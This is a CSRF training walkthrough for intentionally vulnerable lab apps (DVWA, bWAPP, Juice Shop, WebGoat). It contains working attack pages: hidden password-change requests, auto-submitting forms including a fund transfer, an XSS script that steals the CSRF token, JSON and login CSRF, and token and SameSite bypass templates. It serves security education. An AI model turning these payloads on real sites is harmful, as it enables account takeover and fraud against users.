# CSRF Walkthrough

Step-by-step exercises for mastering Cross-Site Request Forgery attacks across multiple vulnerable platforms.

---

## Lab 1: DVWA - Basic CSRF

### Environment Setup

1. Start the CyberLab environment:
```bash
cd /path/to/cyberlab
docker-compose up -d dvwa
```

2. Access DVWA at `http://localhost:8081`

3. Login with default credentials: `admin` / `password`

4. Navigate to **DVWA Security** and set security level to **Low**

### Exercise 1: Understanding CSRF

**Target:** DVWA CSRF page

1. Navigate to **CSRF** in the left menu

2. You'll see a password change form

3. Change the password normally and observe:
   - URL: `/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change`
   - Request is GET-based
   - No CSRF token protection

### Exercise 2: Crafting CSRF Attack

1. Create a malicious HTML file (`csrf_attack.html`):

```html
<!DOCTYPE html>
<html>
<head>
    <title>You won a prize!</title>
</head>
<body>
    <h1>Congratulations! Click below to claim your prize!</h1>

    <!-- Hidden CSRF attack -->
    <img src="http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
         width="0" height="0" style="display:none">

    <p>Loading your prize...</p>
</body>
</html>
```

2. Host this file or open it locally

3. When victim visits while logged into DVWA, their password changes

4. Verify by trying to login with "hacked" as the password

### Exercise 3: Alternative Attack Vectors

**Using iframe:**
```html
<iframe src="http://localhost:8081/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change"
        style="display:none"></iframe>
```

**Using JavaScript redirect:**
```html
<script>
window.location = "http://localhost:8081/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change";
</script>
```

**Flag: `FLAG{g3t_csrf_b4s1c}`**

---

## Lab 2: DVWA - Medium Security CSRF

### Understanding Token Protection

1. Set DVWA security to **Medium**

2. Analyze the form - notice the Referer header check

3. The attack requires matching Referer header

### Bypass Technique

1. If the site checks Referer contains the domain, use:
```html
<!-- Host on: http://attacker.com/localhost:8081/page.html -->
<!-- Referer will contain "localhost:8081" -->
```

2. Alternative: If Referer check is weak:
```html
<meta name="referrer" content="unsafe-url">
<img src="http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
```

3. Some browsers allow suppressing Referer:
```html
<meta name="referrer" content="no-referrer">
```

---

## Lab 3: DVWA - High Security CSRF

### Token Analysis

1. Set DVWA security to **High**

2. View the form source - notice CSRF token:
```html
<input type="hidden" name="user_token" value="abc123def456">
```

3. Each request requires a valid token

### Bypass via XSS

Since DVWA has XSS vulnerabilities, chain them:

1. Find a stored XSS vulnerability

2. Inject payload that:
   - Fetches the CSRF page
   - Extracts the token
   - Submits the password change

```javascript
<script>
// Fetch CSRF page to get token
fetch('/vulnerabilities/csrf/')
  .then(response => response.text())
  .then(html => {
    // Extract token from response
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, 'text/html');
    var token = doc.querySelector('input[name="user_token"]').value;

    // Execute CSRF with stolen token
    var img = new Image();
    img.src = '/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + token;
  });
</script>
```

---

## Lab 4: bWAPP - CSRF Attacks

### Setup

```bash
# Access bWAPP
http://localhost:8082/bWAPP
# Login: bee / bug
```

### CSRF (Change Password)

**Location:** A8 - CSRF (Change Password)

1. Navigate to the vulnerable page

2. Set security level to low

3. Analyze the form:
```html
<form action="/bWAPP/csrf_1.php" method="GET">
    <input name="password_new">
    <input name="password_conf">
</form>
```

4. Create attack page:
```html
<html>
<body>
<img src="http://localhost:8082/bWAPP/csrf_1.php?password_new=pwned&password_conf=pwned&action=change">
</body>
</html>
```

### CSRF (Transfer Amount)

**Location:** A8 - CSRF (Transfer Amount)

1. Navigate to the transfer page

2. Analyze the transfer form

3. Create POST-based attack:
```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:8082/bWAPP/csrf_2.php" method="POST">
    <input type="hidden" name="account" value="attacker_account">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="action" value="transfer">
</form>
</body>
</html>
```

### CSRF (Change Secret)

**Location:** A8 - CSRF (Change Secret)

1. Similar approach - find the action endpoint

2. Craft appropriate payload based on form analysis

---

## Lab 5: Juice Shop - CSRF

### Setup

```bash
# Access Juice Shop
http://localhost:3000
```

### Challenge: CSRF Attack

1. Register/login to get an account

2. Find profile change functionality

3. Analyze how profile changes are submitted

4. Note: Juice Shop may use JWT tokens - check if CSRF is possible

5. Try API endpoints that might lack CSRF protection:
```
POST /api/Users/{id}
PUT /api/Users/{id}
```

### JSON-Based CSRF

If the API accepts JSON:

```html
<html>
<body>
<form action="http://localhost:3000/api/Users/1" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

This creates a body like:
```
{"email":"attacker@evil.com","ignore":"="}
```

---

## Lab 6: WebGoat - CSRF

### Setup

```bash
# Access WebGoat
http://localhost:8080/WebGoat
```

### CSRF Lessons

1. Navigate to A5:2017 - Cross-Site Request Forgery

2. Complete the introductory lessons

3. For the practical exercise:
   - Create an external HTML page
   - Include a form that submits to WebGoat
   - Submit flags or trigger actions

### Basic CSRF Exercise

1. Analyze the target form in WebGoat

2. Create attack page:
```html
<html>
<body>
<form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
    <input type="hidden" name="csrf" value="false">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### Review CSRF Exercise

1. Post a review containing CSRF payload

2. When admin views the review, attack executes

---

## Lab 7: Token Bypass Techniques

### Remove Token Entirely

1. Intercept request with Burp Suite

2. Remove the token parameter

3. Forward and check if request processes

### Empty Token Value

```html
<form action="http://target.com/change" method="POST">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

### Using Another User's Token

1. Get valid token from your session

2. Use it in attack against another user

3. If tokens aren't user-bound, attack succeeds

### Token in Cookie vs Parameter

1. If token is duplicated in cookie and parameter

2. Set both to same arbitrary value:
```html
<script>document.cookie = "csrf_token=attacker_token";</script>
<form action="http://target.com/change" method="POST">
    <input type="hidden" name="csrf_token" value="attacker_token">
    ...
</form>
```

---

## Lab 8: SameSite Cookie Bypass

### Understanding SameSite

- **Strict**: Cookie never sent cross-site
- **Lax**: Cookie sent on top-level GET navigations
- **None**: Cookie always sent (requires Secure)

### Bypassing Lax

SameSite=Lax allows cookies on top-level navigation:

```html
<!-- This works with SameSite=Lax -->
<a href="http://target.com/change-email?email=evil@attacker.com">Click here!</a>

<!-- This doesn't work (background request) -->
<img src="http://target.com/change-email?email=evil@attacker.com">
```

### Method Override

If site accepts method override:
```html
<form action="http://target.com/change-email?_method=POST" method="GET">
    <input name="email" value="evil@attacker.com">
</form>
```

### Newly Created Cookies

Cookies created <2 minutes ago may be sent even with Lax.

---

## Lab 9: Login CSRF

### Concept

Force victim to login with attacker's account, then capture their activity.

### Attack Flow

1. Create login CSRF:
```html
<form action="http://target.com/login" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="attacker_password">
</form>
<script>document.forms[0].submit();</script>
```

2. Victim is now logged in as attacker

3. Victim performs sensitive actions (adds payment info, uploads data)

4. Attacker logs into their account and sees victim's data

### OAuth Account Linking

1. Victim has an account on target site

2. CSRF forces OAuth link with attacker's social account

3. Attacker can now login via OAuth to victim's account

---

## Lab 10: Automated CSRF Testing

### Using Burp Suite

1. Capture a sensitive request

2. Right-click > Engagement Tools > Generate CSRF PoC

3. Burp generates HTML attack page

4. Options:
   - Auto-submit form
   - Include iframe
   - Cross-domain testing

### Using OWASP ZAP

1. Spider the application

2. Review requests for CSRF vulnerabilities

3. Use Anti-CSRF Token Detection

4. Generate attack payloads

### Manual Testing Checklist

```
[ ] Identify state-changing operations
[ ] Check for CSRF tokens
[ ] Test token removal
[ ] Test token reuse
[ ] Check Referer validation
[ ] Test SameSite cookie attributes
[ ] Check custom header requirements
```

---

## Verification Checklist

- [ ] Successfully changed DVWA password via CSRF
- [ ] Bypassed Referer header check
- [ ] Chained XSS with CSRF to bypass tokens
- [ ] Performed POST-based CSRF
- [ ] Tested JSON-based CSRF
- [ ] Exploited Login CSRF
- [ ] Bypassed SameSite=Lax protection
- [ ] Used Burp to generate CSRF PoC

---

## Next Steps

After completing these labs:

1. Study CSRF defenses in modern frameworks
2. Learn about CORS and its relationship to CSRF
3. Explore token binding mechanisms
4. Practice on HackTheBox and TryHackMe
5. Study SameSite cookie evolution in browsers
